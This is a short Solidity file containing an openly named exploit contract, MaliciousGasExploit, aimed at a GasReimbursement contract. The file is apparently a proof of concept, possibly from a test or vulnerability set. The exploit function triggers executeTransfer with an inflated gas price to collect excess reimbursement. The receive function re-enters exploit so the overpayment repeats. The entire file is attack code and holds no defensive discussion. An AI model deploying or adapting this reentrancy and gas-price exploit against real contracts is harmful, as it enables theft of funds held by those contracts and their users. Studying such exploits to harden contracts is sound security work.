// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./gas-price.sol";

contract MaliciousGasExploit {
    GasReimbursement public targetContract;

    constructor(address _targetContract) {
        targetContract = GasReimbursement(_targetContract);
    }

    function exploit(address recipient) public payable {
        // Trigger the vulnerable contract's executeTransfer method with a manipulated high tx.gasprice
        targetContract.executeTransfer(recipient);
    }

    receive() external payable {
        // Allow reentrancy to repeatedly exploit high fee calculation
        exploit(msg.sender);
    }
}